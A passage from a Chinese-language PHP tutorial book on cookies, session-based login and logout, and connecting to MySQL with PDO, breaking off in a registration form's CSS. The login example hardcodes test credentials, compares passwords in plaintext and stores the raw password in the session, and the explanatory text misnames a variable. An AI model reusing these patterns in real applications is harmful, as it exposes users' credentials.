  // 设置 Cookie 有效的域（当前域）\n$domain = \"\";\n\n// 使用 setcookie() 创建 Cookie\nsetcookie($name,\
  \ $theme_value, $expiration, $path, $domain);\n\n// 显示确认消息\necho \"The cookie has\
  \ been created successfully\";\n\n?>\n```\n\n在本例中：\n\n*   Cookie 名称设置为 \"user\"\
  ，其值设置为 \"Alice Dupont\"。\n*   Cookie 从创建时起 1 小时（3600 秒）后过期。\n*   路径定义为 \"/\"，表示\
  \ Cookie 在整个网站有效。\n*   域留空，意味着 Cookie 对当前域有效。\n*   最后，使用 `setcookie()` 函数按指定参数创建\
  \ Cookie。\n*   执行此代码后，将创建一个名为 \"user\"、值为 \"Alice Dupont\" 的 Cookie，有效期为一小时。\n\n\
  结果：\n\n![Image](img/image-137.png)\n\n##### 读取 Cookie\n\n\n\n创建的 Cookie 会自动包含在 `$_COOKIE`\
  \ 超全局变量中。要在 PHP 中读取 Cookie，可以使用 `$_COOKIE` 超全局变量。以下是读取现有 Cookie 的方法：\n\n```php\n\
  <?php\n\n // 检查 Cookie 是否存在\n\n if(isset($_COOKIE[\"user\"])) {\n\n // 获取 \"user\"\
  \ Cookie 的值\n\n $user = $_COOKIE[\"user\"];\n\n // 显示 Cookie 值\n\n echo \"Hello,\
  \ \" . $user . \"! You're back.\";\n\n } else {\n\n // 如果 Cookie 不存在，显示默认消息\n\n\
  \ echo \"Welcome, unknown visitor!\";\n\n }\n\n?>\n```\n\n在本例中：\n\n- 我们首先使用 `isset($_COOKIE[\"\
  user\"])` 检查 \"user\" Cookie 是否存在。\n- 如果 Cookie 存在，我们使用 `$_COOKIE[\"user\"]` 获取其值并将其赋给\
  \ `$user` 变量。\n- 接下来，我们使用 Cookie 值显示个性化欢迎消息，如果 Cookie 不存在则显示默认消息。\n\n这种方法的价值在于个性化用户体验。通过使用\
  \ Cookie，网站可以识别回头访客并为他们提供个性化的欢迎，这可以改善他们在网站上的体验并增强参与度。它还可以使保留某些用户偏好或登录数据变得更加容易，在后续访问网站时提供更流畅、更便捷的体验。\n\
  \n结果：\n\n![Image](img/image-138.png)\n\n#### 修改和删除 Cookie\n\n要修改现有 Cookie，只需创建一个与要修改的\
  \ Cookie 同名的新 Cookie 即可。这将使用指定的新值覆盖旧 Cookie。只需确保指定与原始 Cookie 相同的选项，例如路径和有效期，以避免任何不一致。\n\
  \n例如，如果您想修改之前创建的 \"user\" Cookie，可以按如下方式操作：\n\n```php\n<?php\n\n setcookie('user',\
  \ 'theme_fonce', time() + 72000, '/');\n\n?>\n```\n\n此代码通过将现有 user Cookie 的值替换为\
  \ \"theme_fonce\" 来修改它。修改后的 Cookie 将从执行那一刻起有效 72,000 秒（20 小时），并且可从域根目录访问。\n\n要删除\
  \ Cookie，可以将其值设为空并指定一个过去的过期日期。这会告诉浏览器删除该 Cookie。同样，请确保指定与原始 Cookie 相同的选项，以确保 Cookie\
  \ 被正确删除。\n\n```php\n<?php\n\n // 设置过去的过期日期以删除 Cookie\n\n setcookie('user', '', time()\
  \ - 3600, '/');\n\n?>\n```\n\n在本例中，我们通过将 user Cookie 的值设为空字符串并指定一个过去的过期日期来删除它。这将导致\
  \ Cookie 在用户浏览器上立即过期，从而永久删除它。\n\n#### Cookie 安全\n\n重要的是要注意，Cookie 存储在客户端，用户可以对其进行修改。因此，请勿在\
  \ Cookie 中存储敏感信息，并务必在应用程序中使用前验证和清理所有数据。\n\nCookie 管理是现代 Web 开发的一个重要方面，它提供了一种在用户浏览器上存储临时信息的便捷方式。然而，了解其局限性并安全地使用它们以保证应用程序数据的完整性和机密性至关重要。\n\
  \n#### 会话管理\n\nPHP 中的会话是在不同 HTTP 请求之间维护 Web 应用程序状态的基本技术。会话是在浏览网站时存储特定用户信息的一种方式，例如用户身份验证、购物车、用户偏好等。与\
  \ Cookie 不同，会话数据存储在服务器上，这使其更加安全，因为它不会暴露给客户端。\n\n##### 会话管理流程\n\nPHP 会话管理流程包含以下步骤：\n\
  \n**会话启动**：在使用会话之前，需要通过调用 `session_start()` 函数来启动会话。此函数初始化一个新会话，如果会话已存在则恢复现有会话。\n\
  \n**在会话中存储数据**：会话启动后，可以使用 `$_SESSION` 关联数组在会话中存储数据。存储在 `$_SESSION` 中的数据在会话期间可用于网站的所有页面。\n\
  \n**访问会话数据**：要访问存储的会话数据，只需使用带有适当键的 `$_SESSION` 数组来访问对应的值。\n\n**关闭会话**：当您完成会话工作后，可以通过调用\
  \ `session_destroy()` 函数来关闭它。这将销毁所有现有的会话数据。\n\n会话的优势：\n\n**安全性**：会话数据存储在服务器上，比客户端\
  \ Cookie 更安全。\n\n**持久性**：会话数据在会话期间一直可用，即使用户在网站的不同页面间导航。\n\n**灵活性**：会话可以存储大量数据，使其成为管理敏感或复杂信息的理想选择。\n\
  \n##### 实际示例\n\n为了更好地理解会话的工作原理，让我们以一个带有会员区的网站为例。每个用户必须登录才能访问此区域，并且必须确保用户在整个网站会话期间保持已识别状态。\n\
  \n为此，我们需要为用户提供一个登录表单：\n\n让我们首先创建一个新的 `connetion.php` 文件，其中包含以下表单：\n\n```html\n<!DOCTYPE\
  \ html>\n<html lang=\"en\">\n\n<head>\n\n<meta charset=\"UTF-8\">\n\n<meta name=\"\
  viewport\" content=\"width=device-width, initial-scale=1.0\">\n\n<title>Connect\
  \ to member area</title>\n\n</head>\n\n<body>\n\n<h2>Connect to member area</h2>\n\
  \n<form action=\"verification.php\" method=\"post\">\n\n <div>\n\n <label for=\"\
  username\">Username:</label>\n\n <input type=\"text\" id=\"username\" name=\"username\"\
  >\n\n </div>\n\n <br>\n\n <div>\n\n <label for=\"password\">Password:</label>\n\n\
  \ <input type=\"password\" id=\"password\" name=\"password\">\n\n </div>\n\n <div>\n\
  \n <input type=\"submit\" value=\"Login\">\n\n </div>\n\n</form>\n\n</body>\n\n\
  </html>\n```\n\n此表单通过 POST 方法将用户输入的数据发送到名为 \"verification.php\" 的验证脚本。它包含两个字段：一个用于用户名（\"\
  text\" 类型），一个用于密码（\"password\" 类型）。\n\n\"verification.php\" 文件将负责验证用户提供的信息，以授权或拒绝访问会员区。但为了本示例的目的，我们的目标是解释会话如何工作，以便数据可以在页面间传递。\n\
  \n为了实践我们的示例，我们创建一个名为 \"verification.php\" 的文件，在其中为测试目的定义一个基本的用户名和密码。理想情况下，在实际场景中，我们会查询数据库以验证用户提供的信息的真实性。\n\
  \n##### 启动和存储会话数据\n\n```php\n<?php\n\n // 用于测试的基本用户名和密码\n\n $valid_username = \"\
  toto\";\n\n $valid_password = \"azerty123\";\n\n // 检查表单数据是否已发送\n\n if (isset($_POST['username'])\
  \ && isset($_POST['password'])) {\n\n // 检查用户名和密码是否正确\n\n if ($valid_username ==\
  \ $_POST['username'] && $valid_password == $_POST['password']) {\n\n // 启动会话\n\n\
  \ session_start();\n\n // 保存会话参数\n\n $_SESSION['username'] = $_POST['username'];\n\
  \n $_SESSION['password'] = $_POST['password'];\n\n // 显示欢迎消息和会员区链接\n\n echo \"Logged\
  \ in as \" . $_SESSION['username'] . \"<br />\";\n\n echo 'You can access the members\\\
  ' area: <a href=\"members.php\">Link to members\\' page</a>';\n\n } else {\n\n //\
  \ 如果用户名或密码不正确，显示错误消息\n\n echo 'Sorry, the username or password is incorrect.';\n\
  \n }\n\n } else {\n\n // 如果未发送表单数据，显示消息\n\n echo 'You need to go to the login page.';\n\
  \n }\n\n?>\n```\n\n以下是代码的详细解释：\n\n*   **初始化变量：**\n\n\n\n\n`$valid_username` 和 `$valid_password`\
  \ 被定义为连接的有效用户名和密码。在实际场景中，这些值通常会根据数据库或其他认证系统进行核对。\n\n##### 检查表单数据\n\n`if` 条件 (`isset($_POST['username'])\
  \ && isset($_POST['password'])`) 检查表单数据是否已通过 `POST` 方法提交。\n\n##### 检查登录名和密码\n\n\
  如果表单数据已提交，代码会检查用户名和密码是否与先前定义的有效值相符。这是通过条件 `if ($valid_username == $_POST['username']\
  \ && $password == $_POST['password'])` 完成的。\n\n##### 启动会话\n\n如果登录名和密码正确，则使用 `session_start()`\
  \ 启动会话。随后，用户信息通过 `$_SESSION['username']` 和 `$_SESSION['password']` 存储在会话变量中。\n\n\
  ##### 消息显示\n\n如果登录名和密码正确，将显示欢迎消息，包含已登录用户的姓名以及一个指向会员专属页面的链接。\n\n![Image](img/image-139.png)\n\
  \n如果用户 ID 或密码不正确，将显示错误消息以告知用户。\n\n![Image](img/image-140.png)\n\n##### 错误情况处理\n\n\
  如果未提交表单数据，将显示一条消息提示用户前往登录页面。\n\n这段代码展示了一个在 PHP 中进行登录、密码验证和会话管理的简单示例。\n\n#### 访问会话数据\n\
  \n在 `members.php` 页面中（用户登录后将被重定向至此），你应该通过验证其会话信息是否存在来检查用户是否已登录。如果用户已登录，则可以显示会员专属内容。\n\
  \n以下是你可以在 `members.php` 页面中包含的示例：\n\n```php\n<?php\n\nsession_start();\n\n// 检查用户是否已登录\n\
  if (isset($_SESSION['username']) && isset($_SESSION['password'])) {\n    // 显示会员专属内容\n\
  \    echo 'Welcome to the members\\' area, ' . $_SESSION['username'];\n    echo\
  \ '<br>';\n    echo 'Members-only content...<br />';\n    echo '<a href=\"logout.php\"\
  >Log out</a>'; // 断开连接的链接\n} else {\n    // 如果未登录，将用户重定向到登录页面\n    header('Location:\
  \ login.php');\n    exit();\n}\n\n?>\n```\n\n这段 PHP 代码检查用户是否作为会员登录。其工作原理如下：\n\n\
  第一步是通过调用 `session_start()` 函数启动会话，该函数必须在代码最开始处声明。这使得访问存储的会话信息成为可能。\n\n接下来，代码通过验证\
  \ `$_SESSION` 数组中 \"username\" 和 \"password\" 键的存在性，来检查用户的会话信息是否存在。这些键包含用户的身份识别信息，这些信息是在连接时存储的。\n\
  \n如果会话信息存在，则意味着用户已登录。代码随后使用存储在 `$_SESSION['username']` 中的值显示个性化欢迎消息，该值代表已登录用户的标识符。\n\
  \n接下来，代码显示会员专属内容。在本例中，这只是一条指示这是会员专属内容的消息，但在实际应用中，你可以显示各种专属于会员的功能或信息。\n\n最后，代码显示一个“注销”链接，将用户重定向到注销页面\
  \ (`logout.php`)。该页面负责销毁会话，允许用户登出。\n\n![Image](img/image-141.png)\n\n如果会话信息不存在，则用户未登录。在这种情况下，代码会使用\
  \ `header('Location: login.php')` 函数自动将用户重定向到登录页面 (`login.php`)。这确保只有已登录用户才能访问会员专属内容。\n\
  \n#### 注销并关闭会话\n\n最后一步是注销用户并销毁会话。在 PHP 中具体操作如下：\n\n创建一个名为 `logout.php` 的页面来管理注销过程。\n\
  \n*   在此页面上，使用 `session_start()` 启动会话以访问会话信息。\n*   然后使用 `session_unset()` 函数销毁与用户关联的会话变量。\n\
  *   然后使用 `session_destroy()` 函数彻底销毁当前会话，删除与用户关联的所有会话数据。\n\n销毁会话后，使用 `header('Location:\
  \ index.php')` 函数将用户重定向到另一个页面，例如登录页或主页。\n\n`logout.php` 页面的代码如下所示：\n\n```php\n<?php\n\
  \nsession_start(); // 我们启动会话\nsession_unset(); // 我们销毁我们的会话变量\nsession_destroy();\
  \ // 销毁我们的会话\n\n// 将访问者重定向到主页\nheader('Location: index.php');\n\n?>\n```\n\n这段代码能有效地让用户断开连接并将他们重定向到主页。但值得注意的是，`session_unset()`\
  \ 函数是可选的，因为 `session_destroy()` 已经删除了所有会话数据。在大多数情况下，仅使用 `session_destroy()` 就足够了。\n\
  \n#### 结论\n\n在本章中，我们详细探讨了 PHP 中的 Cookie 和会话管理。我们学习了如何使用 Cookie 存储关于用户浏览器的信息，从而实现个性化用户体验和跟踪网站访客活动。我们还学习了会话，它提供了一种安全的方式来存储每个活跃用户的临时服务器端数据，对于管理认证和维护应用程序状态特别有用。\n\
  \n通过理解创建、读取、修改和删除 Cookie 的机制，以及创建和销毁会话的机制，PHP 开发人员可以在其 Web 应用程序中实现高级功能，例如用户会话管理、内容个性化、购物车管理等。\n\
  \n必须注意的是，Cookie 和会话管理必须谨慎进行，以保证用户数据的安全性和机密性。通过遵循良好的开发实践并使用适当的 PHP 函数，开发人员可以创建健壮、安全的\
  \ Web 应用程序，提供流畅、可靠的用户体验。\n\n简而言之，理解 Cookie 和会话管理对于任何希望创建交互式和动态 Web 应用程序的 PHP 开发人员来说都是基础。通过掌握这些概念，开发人员可以创建更高效、更用户友好的网站。\n\
  \n### C 部分：MySQL 数据库管理\n\n数据管理是现代 Web 开发的基础支柱。鉴于此，PHP 和 MySQL 是创建动态、交互式 Web 应用程序的必备工具。本书的\
  \ C 部分重点关注数据库在 PHP 项目中的高效集成，特别强调 MySQL。\n\n在本部分中，我们将深入探讨在 PHP 中使用数据库所涉及的关键概念。我们将首先了解如何从\
  \ PHP 脚本建立到 MySQL 数据库的安全连接，重点关注避免潜在漏洞的良好安全实践。\n\n然后我们将学习如何使用 SQL 查询从数据库查询数据。我们将介绍各种数据操作技术，包括使用\
  \ PHP 脚本在 MySQL 数据库中插入、选择、更新和删除数据。\n\n通过本部分的学习，你将深入理解数据库在 PHP 项目中的集成，增强开发健壮、安全、高性能\
  \ Web 应用程序的技能。\n\n### 第 10 章：数据库简介及连接 MySQL 数据库\n\n数据库在动态、交互式 Web 应用程序的开发中发挥着至关重要的作用。它们能够高效地存储、组织和操作大量数据，为我们的应用程序提供坚实的结构。在本章中，我们将探讨数据库的工作原理，重点介绍如何从\
  \ PHP 脚本连接到 MySQL 数据库。本章将分为三个部分：\n\n\n\n\n\n##### 理解数据库\n\n在第一部分中，我们将深入探讨数据库的基本概念。我们将了解什么是数据库、它的不同类型（关系型、NoSQL\
  \ 等），以及表、列、记录和键等关键要素。\n\n##### MySQL 简介\n\nMySQL 是 Web 开发领域中最流行、应用最广泛的关系型数据库管理系统之一。在本节中，我们将认识\
  \ MySQL，探索其历史、架构和关键特性。\n\n##### PHP 连接 MySQL 数据库\n\n现在我们已经对数据库和 MySQL 有了基本的了解，将转向实践环节，学习如何在\
  \ PHP 和 MySQL 数据库之间建立连接。我们将介绍配置连接参数、打开和关闭连接所需的步骤，以及保护凭据安全的良好安全实践。\n\n总之，本章将为我们在\
  \ PHP 应用程序中进一步探索数据库集成奠定基础，提供建立安全高效的 MySQL 数据库连接所需的知识和技能。\n\n##### 理解数据库\n\n在深入探讨使用\
  \ PHP 进行数据库管理的技术细节之前，理解数据库如何工作的基本原理至关重要。\n\n###### 什么是数据库？\n\n数据库是一个有组织的数据集合，其结构旨在便于访问、高效处理和一致更新。它被设计用于永久存储信息，以便日后检索和使用。\n\
  \n###### 数据库类型\n\n存在许多不同类型的数据库，每种都有其特定的特征和用途。主要的两种类型是关系型数据库和 NoSQL 数据库。\n\n*   **关系型数据库**：这些基于关系模型，使用表来存储数据。表之间的关系通过主键和外键建立，从而能够一致地管理结构化数据。\n\
  *   **NoSQL 数据库**：这些采用更灵活、结构更少的数据存储方法。它们常用于需要可扩展性以及非结构化或半结构化数据管理灵活性的应用程序。\n\n![Image](img/image-142.png)\n\
  \n###### 关系型数据库的关键要素\n\n在关系型数据库中，数据被组织成不同的实体，如表、列和记录。以下是关系型数据库的主要要素：\n\n*   **表**：这些代表关联的数据集。每个表由行和列组成。\n\
  *   **列**：这些定义了构成表的各种属性或数据字段。\n*   **记录**：它们代表存储在表中的单个数据，每条记录对应表中的一行。\n*   **主键和外键**：这些用于建立表之间的关系。主键是表中每条记录的唯一标识符，而外键用于引用另一张表中的主键。\n\
  \n![Image](img/image-143.png)\n\n###### 数据处理\n\n数据库中的数据操作涉及插入、更新、检索和删除数据。这些操作使用\
  \ `SQL`（结构化查询语言）查询来执行，这是一种专门设计用于与关系型数据库交互的编程语言。\n\n简而言之，理解数据库对任何开发人员都至关重要，因为它为有效设计和管理复杂信息系统提供了必要的基础。\n\
  \n###### 不同的数据库管理系统 (DBMS)\n\n数据库管理系统 (DBMS) 是旨在管理数据库的软件程序，确保其创建、操作、存储和访问。存在几种类型的\
  \ DBMS，每种都有其自身的特征和功能。主要的 DBMS 类型包括：\n\n*   **关系型 DBMS**：此类 DBMS 基于关系模型，使用 `SQL`\
  \ 语言管理数据。流行的关系型 DBMS 示例包括 `MySQL`、`PostgreSQL`、`Oracle Database` 和 `Microsoft SQL\
  \ Server`。\n*   **NoSQL DBMS**：NoSQL DBMS 采用不同于关系型 DBMS 的数据管理方法。它们旨在管理非结构化或半结构化数据，并提供高可扩展性。NoSQL\
  \ DBMS 的示例包括 `MongoDB`、`Cassandra` 和 `Redis`。\n*   **面向对象 DBMS**：这些 DBMS 旨在存储和操作对象，而非表格数据。它们为建模复杂数据提供了更灵活的方法。面向对象\
  \ DBMS 的示例包括 `db4o` 和 `ObjectDB`。\n*   **内存型 DBMS**：这些 DBMS 将数据完全存储在内存中，从而实现极快的数据访问。它们用于需要高性能的应用程序。内存型\
  \ DBMS 的示例包括 `Redis` 和 `Memcached`。\n\n每种类型的 DBMS 都有其优缺点，选择合适的 DBMS 取决于应用程序的具体需求和技术限制。就本书而言，我们将主要专注于作为关系型\
  \ DBMS 的 `MySQL`。`MySQL` 是一种广泛使用的开源 DBMS，以其可靠性、性能和易用性而闻名。专注于 `MySQL`，我们将在使用 PHP\
  \ 进行 Web 开发的背景下，探索其用于高效数据库管理的用法和特性。\n\n在本书中，我们已经安装了 `XAMPP Server`，这是一个包含 `Apache`、`MySQL`、`PHP`\
  \ 和 `Perl` 的 Web 开发包。这意味着 `MySQL` 已经包含在 `XAMPP` 的安装中。\n\n事实上，通过使用 `XAMPP`，你的系统上不仅安装了\
  \ `MySQL`，还安装了 `Apache` 和 `PHP`，使你能够在本地创建和测试 Web 应用程序。\n\n##### MySQL 简介\n\n######\
  \ MySQL 介绍\n\n`MySQL` 是一种广泛用于 Web 开发的开源关系型数据库管理系统。它最初由 `MySQL AB` 于 1995 年开发，自 2010\
  \ 年被收购后，现由 `Oracle Corporation` 维护。`MySQL` 以其可靠性、性能和易用性而闻名，使其成为全球开发人员和企业的热门选择。\n\
  \n###### MySQL 架构\n\n`MySQL` 采用客户端-服务器架构。`MySQL` 服务器是管理数据库的核心组件，而客户端连接到服务器以访问和操作数据。`MySQL`。\n\
  \n![Image](img/image-144.png)\n\n在此架构中：\n\n*   **客户端**：代表与 `MySQL` 服务器交互以发送请求并接收结果的客户端应用程序。\n\
  *   **MySQL 服务器**：处理客户端连接，解析并执行 `SQL` 查询，管理安全性、数据访问和事务。\n*   **数据库存储**：数据在磁盘上物理存储的位置。\n\
  \n这种客户端-服务器架构是 `MySQL` 等关系型数据库管理系统的典型特征。客户端将 `SQL` 查询发送给 `MySQL` 服务器，后者执行查询，检索结果并将其返回给客户端。\n\
  \n###### MySQL 的优势\n\n`MySQL` 的优势包括其稳定性、高性能、与许多平台和编程语言的兼容性、适应不同规模应用程序的灵活性、处理大量数据的可扩展性，以及其活跃的社区和支持生态系统。\n\
  \n###### MySQL 的局限性\n\n尽管 `MySQL` 是一个健壮的数据库管理系统，但它确实存在某些局限性。例如，某些高级功能（如事务管理和集群功能）可能不如其他数据库管理系统那样完善。此外，`MySQL`\
  \ 的免费版本可能在硬件资源和可用功能方面有所限制。\n\n###### MySQL 的用途\n\n`MySQL` 广泛应用于各个领域，包括 Web 应用程序、内容管理系统\
  \ (CMS)（如 `WordPress` 和 `Drupal`）、数据分析应用程序、移动应用程序等。其通用性和健壮性使其成为各种项目和应用程序的热门选择。\n\
  \n##### PHP 连接 MySQL 数据库\n\n\n\n\n现在我们已经对数据库和 MySQL 有了基本的了解，接下来将进入实战部分：从 PHP 脚本连接到\
  \ MySQL 数据库。事实上，要想查询数据库，首先必须与该数据库建立连接。在本书的这一部分，我们将学习建立安全连接、配置连接参数、打开和关闭连接所涉及的步骤，以及保护我们凭据的良好安全实践。\n\
  \n简而言之，本节将为我们提供理解并建立到 MySQL 数据库的安全连接所需的知识和技能，为我们进一步探索 PHP 应用程序中的数据库集成奠定基础。\n\n通常有两种主要方法用于管理到\
  \ MySQL 数据库的连接：使用 `mysqli_` 扩展和使用 `PDO` (PHP Data Objects) 对象。两者都提供了建立安全连接和与 MySQL\
  \ 数据库交互的强大功能。\n\n第一种方法是 `mysqli_` 扩展，它提供了一个特定于 MySQL 的接口，包含诸如用于建立连接的 `mysqli_connect()`、用于执行\
  \ SQL 查询的 `mysqli_query()` 以及用于检索结果的 `mysqli_fetch_array()` 等函数。该扩展直接集成在 PHP 中，为与\
  \ MySQL 的交互提供了高性能。\n\n第二种方法是 `PDO` 扩展，它为处理不同数据库（包括 MySQL）提供了一个更通用的接口。`PDO` 提供了更通用的数据库抽象层，使得在必要时更容易切换数据库。它还支持预处理语句，能提供更强的防\
  \ SQL 注入安全性。\n\n在 `mysqli_` 和 `PDO` 之间进行选择，通常取决于开发者的偏好和项目的具体需求。这两种方法都被广泛使用，并为在 PHP\
  \ 中与 MySQL 交互提供了全面的功能。在本书中，我们将重点介绍 `PDO` 对象的使用。\n\n##### 什么是 PDO？\n\n`PDO` (PHP\
  \ Data Objects) 是 PHP 5 中引入的一个扩展，它提供了一个数据抽象层，这意味着它不专门绑定 MySQL，且独立于所使用的数据库。得益于 `PDO`，代码变得非常易于移植，仅通过修改连接行，即可从\
  \ `MySQL` 数据库切换到 `SQLite`、`PostgreSQL`、`Oracle` 等其他数据库。\n\n`PDO` 提供了许多优势，包括可移植性、易用性和速度。确实，该扩展为与不同数据库交互提供了统一的接口，简化了代码的开发和维护。\n\
  \n##### PDO 扩展包含三个主要类：\n\n###### `PDO` 类\n创建代表数据库连接的对象，并提供用于基本操作的方法，例如发送查询、创建预处理语句和管理事务。\n\
  \n###### `PDOStatement` 类\n代表一条预处理语句或 SELECT 查询结果。其方法用于管理预处理语句和读取查询结果。\n\n######\
  \ `PDOException` 类\n允许你使用对象来管理和显示错误信息，从而更容易调试和管理应用程序中的错误。\n\n##### 数据库连接过程\n\n使用\
  \ `PDO` 连接到 MySQL 数据库的过程包含两个主要步骤：\n\n1.  **创建 `PDO` 类的实例**：首先，通过指定数据库连接参数（如主机名、数据库名、用户名和密码）来创建\
  \ `PDO` 类的实例。\n2.  **错误处理**：建议配置 `PDO`，使其在连接或查询执行期间发生错误时生成异常。这使得可以在代码中适当地处理错误。\n\
  \n为了具体说明这一过程，让我们以创建一个 `library` (图书馆) Web 应用程序为例。在创建相应的数据库之前，先在你的 Apache 服务器上创建一个名为\
  \ `library` 的目录，即如果你按照第 1 章的说明安装了 XAMPP，则在其 `htdocs` 文件夹中创建。\n\n###### 创建 \"library\"\
  \ 数据库\n\n接下来，我们创建一个名为 `library` 的数据库及其相关表：\n\n此时，数据库包含三张表：\n\n*   **`books` 表**：`book_id`、`title`、`description`、`year_published`、`author_id`、`category_id`\n\
  *   **`authors` 表**：`author_id`、`last_name`、`first_name`、`email`、`password`、`biography`\n\
  *   **`categories` 表**：`category_id`、`category_name`\n\n每张表都有一个唯一的主键：`books` 表为\
  \ `book_id`，`authors` 表为 `author_id`，`categories` 表为 `category_id`。\n\n此外，在 `books`\
  \ 表中，`author_id` 和 `category_id` 列作为外键，分别引用 `authors` 和 `categories` 表的主键。这种结构使得在各表之间建立关系成为可能。例如，每本书都关联一个特定的作者和一个特定的类别，从而可以根据这些关系轻松地组织和检索数据。\n\
  \n![Image](img/image-145.png)\n\n要为该应用程序创建数据库，请在启动 XAMPP 后通过以下 URL 访问 phpMyAdmin：`http://localhost/phpmyadmin/`。接下来，创建一个新数据库，我们将其命名为\
  \ `library`。\n\n![Image](img/images-146.png)\n\n接下来，创建三张表 `authors`、`books` 和 `categories`。下图展示了\
  \ `authors` 表的创建过程。请注意，`author_id` 属性是作者标识符，类型为 `INT` (整数) 且将自动递增。为此，请勾选 `AI` (Auto-incremented，自动递增)\
  \ 列中的复选框。`last_name`、`first_name`、`email` 和 `password` 属性的类型为 `VARCHAR` (字符串)。`biography`\
  \ 属性的类型为 `text`，以允许最多 65565 个字符。\n\n按照相同的过程，接着创建另外两张表 `books` 和 `categories`。\n\n\
  ![Image](img/image-147.png)\n\n###### 连接到 \"library\" 数据库\n\n在 `library` 项目目录中，创建一个名为\
  \ `index.php` 的新文件。在该文件中，插入以下代码以测试与 `library` 数据库的连接。\n\n```php\n<?php\n\n// 数据库连接信息\n\
  $host = 'localhost';\n$dbname = 'library';\n$username = 'root';\n$password = '';\n\
  \ntry {\n    // 创建 PDO 类的实例以建立连接\n    $connection = new PDO(\"mysql:host=$host;dbname=$dbname\"\
  , $username, $password);\n\n    // 设置 PDO 在发生错误时生成异常\n    $connection->setAttribute(PDO::ATTR_ERRMODE,\
  \ PDO::ERRMODE_EXCEPTION);\n\n    echo \"数据库连接成功建立\";\n} catch (PDOException $e)\
  \ {\n    // 连接错误处理\n    echo \"连接错误: \" . $e->getMessage();\n}\n?>\n```\n\n在本例中：\n\
  \n*   变量 `$host`、`$dbname`、`$username` 和 `$password` 包含连接到 MySQL 数据库所需的信息。\n*  \
  \ 由于 `library` 应用程序是在本地开发的，`$host` 的值为 `localhost`，`$username` 的值为 `root`。`$dbname`\
  \ 变量代表数据库名称，在本例中为 `library`。`$password` 变量为空，因为未为 `library` 数据库定义密码。\n*   然后，我们使用\
  \ `new` 关键字实例化一个 `PDO` 对象，并使用这些连接信息，我们将在 PHP 面向对象编程部分更详细地解释该关键字。\n*   我们使用语法 `mysql:host=$host;dbname=$dbname`\
  \ 来指定数据库类型 (MySQL)、主机 (服务器) 和数据库名称。\n*   方法 `setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION)`\
  \ 用于设置 PDO 的错误处理模式。以下是该指令各部分的含义：\n    *   `PDO::ATTR_ERRMODE` 是一个常量，指示我们正在配置的属性类型。在本例中，我们配置的是错误处理模式。\n\
  \    *   `PDO::ERRMODE_EXCEPTION` 是一个常量，将错误处理模式定义为基于异常。这意味着如果在执行 SQL 查询时发生错误，`PDO`\
  \ 将自动抛出一个 `PDOException`。\n\n\n\n通过使用此错误处理模式，与 SQL 查询执行相关的错误将自动转换为 `PDOException`\
  \ 异常，从而使得在代码中使用 `try-catch` 块进行处理变得更加容易。这使得错误处理更加明确和高效。\n\n最后，我们显示一条消息，指示数据库连接已成功建立，或者在发生连接问题时显示错误消息。\n\
  \n如果您通过执行 `index.php` 脚本来测试此代码，并且连接成功，您将获得以下结果：\n\n![Image](img/image-148.png)\n\
  \n但是，如果数据库连接信息中发生错误，您将收到类似于以下结果的消息：\n\n![Image](img/image-149.png)\n\n#### 结论\n\n\
  本章让我们详细了解了使用 PHP 连接 MySQL 数据库的过程。我们深入探讨了 `PDO` 对象方法。我们学习了如何有效地配置和处理连接错误。我们还探讨了数据库设计中主键和外键的概念，以及在\
  \ phpMyAdmin 中创建数据库和表的实际步骤。最后，我们查看了一个数据库连接和错误处理的具体示例。本章是理解 PHP Web 开发背景下 MySQL 数据库管理的第一步。在后续章节中，我们将研究用于数据库管理的\
  \ SQL 查询。\n\n### 第 11 章：从数据库插入、检索和显示数据\n\n在本章中，我们将介绍使用 PHP 和 `PDO` 扩展从 MySQL 数据库插入、检索和显示数据所涉及的各个步骤。我们将探讨用于插入新数据的\
  \ SQL 查询，以及用于执行这些查询并在 Web 应用程序中高效显示结果的 `PDO` 方法。\n\n我们将探讨用于执行 SQL 插入查询并将新数据插入数据库的\
  \ `PDO` 方法。这将包括使用带参数的预处理 SQL 查询以及使用 `execute()` 执行查询。\n\n我们将讨论从数据库检索已插入数据并在 Web\
  \ 应用程序中显示它的各种技术。这还将包括使用循环遍历结果记录并以 HTML 表格及其他展示格式显示数据。\n\n本章将通过开发一个迷你图书馆项目来讲解，并将为您提供关于如何在\
  \ PHP Web 应用程序中使用 `PDO` 扩展插入、检索和显示 MySQL 数据库数据的实用且深入的理解，同时专注于安全性和良好的开发实践。\n\n####\
  \ 使用 SQL 进行数据插入\n\n为了演示将数据插入 MySQL 数据库的过程，我们将为“library”（图书馆）数据库中的“authors”（作者）表创建一个美观的插入表单。第一步是在\
  \ `index.php` 文件中创建插入表单，我们将使用 CSS 代码来美化表单。我假设您了解 CSS 基础知识，如果不了解，我建议您参阅我的书籍“HTML\
  \ & CSS: from Beginner to Expert”（HTML 与 CSS：从入门到精通）。\n\n##### 插入表单 (index.php)\n\
  \n```\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"UTF-8\">\n<meta\
  \ name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n<title>Author\
  \ Inscription</title>\n<link rel=\"stylesheet\" href=\"style.css\">\n</head>\n<body>\n\
  \ <form action=\"author_registration.php\" method=\"POST\">\n <h2>Author registration</h2>\n\
  \ <input type=\"text\" name=\"lastname\" placeholder=\"Last Name\"><br>\n <input\
  \ type=\"text\" name=\"firstname\" placeholder=\"First Name\"><br>\n <input type=\"\
  email\" name=\"email\" placeholder=\"Email\"><br>\n <input type=\"password\" name=\"\
  password\" placeholder=\"Password\"><br>\n <textarea name=\"biography\" placeholder=\"\
  biography\"></textarea><br>\n <input type=\"submit\" value=\"Save\">\n </form>\n\
  </body>\n</html>\n```\n\n此 HTML 代码创建了一个作者注册表单，包含姓氏、名氏、电子邮件和密码字段。提交表单时，数据通过 `POST`\
  \ 方法发送到 `author_registration.php` 文件页面。表单使用外部样式表 `style.css` 进行美化，代码行如下：\n\n```\n\
  <link rel=\"stylesheet\" href=\"style.css\">\n```\n\n##### CSS 样式表\n\n接下来，我们创建一个新的\
  \ `style.css` 文件，并在其中放入以下代码以美化表单：\n\n```\nbody {\n font-family: Arial, sans-serif;\n\
  \ background-color: #f4f4f4;\n margin: 0;\n padding: 0;\n display: flex;\n justify-content:\
  \ center;\n align-items: center;\n height: 100vh;\n}\nform {\n background-color:\
  \ #fff;\n padding: 20px;\n border-radius: 8px;\n box-shadow: 0px 2px 5px rgba(0,\
  \ 0, 0, 0.1);\n width: 400px;\n margin: auto; /* Ajout de cette ligne */\n}\ninput\
